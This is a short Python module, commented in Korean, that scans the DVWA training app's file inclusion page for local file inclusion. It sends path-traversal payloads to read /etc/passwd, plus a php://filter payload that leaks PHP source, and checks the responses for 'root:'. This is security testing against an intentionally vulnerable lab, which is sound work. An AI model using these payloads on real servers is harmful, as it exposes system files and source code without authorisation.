# -*- coding: utf-8 -*-
"""
File Inclusion (LFI) 취약점 탐지

DVWA의 fi 페이지는 page 파라미터로 어떤 php 파일을 보여줄지 정하는데,
검증이 부실하면 서버의 다른 파일(예: /etc/passwd)을 읽어올 수 있다.
"""

LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//....//....//etc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=include.php",
]


def scan_file_inclusion(session, base_url, security_level):
    url = f"{base_url}/vulnerabilities/fi/"
    results = []

    for payload in LFI_PAYLOADS:
        resp = session.get(url, params={"page": payload})

        detected = "root:" in resp.text

        results.append({
            "security_level": security_level,
            "vuln_type": "File Inclusion",
            "category": "lfi",
            "payload": payload,
            "url": url,
            "detected": detected,
            "detail": (
                "서버 파일(/etc/passwd) 읽기 성공 -> 취약"
                if detected else
                "파일 읽기 실패 또는 차단됨"
            ),
        })

    return results 
